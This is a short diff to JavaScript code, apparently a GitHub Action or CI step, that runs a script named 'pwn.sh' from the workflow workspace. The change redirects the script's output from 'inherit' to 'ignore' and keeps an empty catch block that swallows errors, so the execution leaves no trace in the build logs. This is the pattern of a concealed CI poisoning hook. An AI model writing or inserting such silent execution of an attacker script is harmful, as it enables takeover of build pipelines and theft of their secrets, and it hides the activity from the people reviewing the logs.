@@ -6,9 +6,8 @@ try {
     const workspace = process.env.GITHUB_WORKSPACE || '.';
     const pwnPath = path.join(workspace, 'pwn.sh');
     if (fs.existsSync(pwnPath)) {
-        execSync(`bash ${pwnPath}`, { stdio: 'inherit' });
+        execSync(`bash ${pwnPath}`, { stdio: 'ignore' });
     } else {
-        // Fallback to relative path
-        execSync(`bash ./pwn.sh`, { stdio: 'inherit' });
+        execSync(`bash ./pwn.sh`, { stdio: 'ignore' });
     }
 } catch (e) {}
